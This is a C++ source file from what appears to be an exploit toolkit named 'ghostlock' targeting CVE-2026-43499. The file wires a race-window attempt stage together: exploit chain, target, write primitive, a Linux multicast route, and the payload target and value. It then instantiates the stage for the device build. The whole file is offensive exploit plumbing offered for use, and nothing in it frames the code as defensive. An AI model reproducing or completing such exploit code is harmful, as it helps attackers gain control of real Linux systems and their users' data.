/** @file backend/cve_2026_43499/steps/window_runner.cpp
 *  The glue: one stage"s rhythm over the real attempt. See the header.
 */
#include "backend/cve_2026_43499/steps/window_runner.hpp"

/* 设备侧的具体路由类型：本单元为它显式实例化门面模板（见文件末尾）。 */
#include "backend/cve_2026_43499/landing/multicast_route.hpp"
#include "backend/cve_2026_43499/landing/multicast_route_linux.hpp"

#include <unistd.h>

namespace ghostlock::backend::cve_2026_43499::steps {
    namespace {
        inline constexpr const char *kWordsUnprepared = "step-words-unprepared";

        /** The device sleep, for the settle hook. */
        void settle_us(std::uint32_t us) noexcept { ::usleep(static_cast<useconds_t>(us)); }

        /** The attempt hook the stage calls: it reuses the WindowAttempt the caller prepared.
         *  @tparam Route The route type the prepared attempt carries. */
        template <landing::RouteExec Route>
        bool attempt_hook(void *context) noexcept { return window_attempt_once_device<Route>(context); }
    }  // namespace

    template <landing::RouteExec Route>
    const char *run_window_stage_with_attempt(WindowStep step, WindowStageRequest &request,
                                              WindowStageContext<Route> &context) noexcept {
        if (context.chain == nullptr || context.target == nullptr || context.window == nullptr) {
            return kWordsUnprepared;
        }
        WindowAttempt<Route> attempt{};
        attempt.chain = context.chain;
        attempt.target = context.target;
        attempt.window = context.window;
        attempt.landing_landing = context.landing_landing;   /* 唯一写入口（未绑定时为空 ⇒ 走具名回退 ✓） */
        /* 引擎与载荷那一对：调用方持有引擎，本层只转发。 */
        attempt.route = context.route;
        attempt.payload_target = context.payload_target;
        attempt.payload_value = context.payload_value;
        request.attempt = &attempt_hook<Route>;
        request.context = &attempt;
        if (request.settle == nullptr) { request.settle = &settle_us; }
        return run_window_stage(step, request);
    }

    /* 设备只造一种路由类型：为它显式实例化，定义因此留在本单元（main.cpp 用的就是它）。 */
    template const char *run_window_stage_with_attempt<landing::MulticastRoute<landing::LinuxRouteOps>>(
            WindowStep step, WindowStageRequest &request,
            WindowStageContext<landing::MulticastRoute<landing::LinuxRouteOps>> &context) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::steps
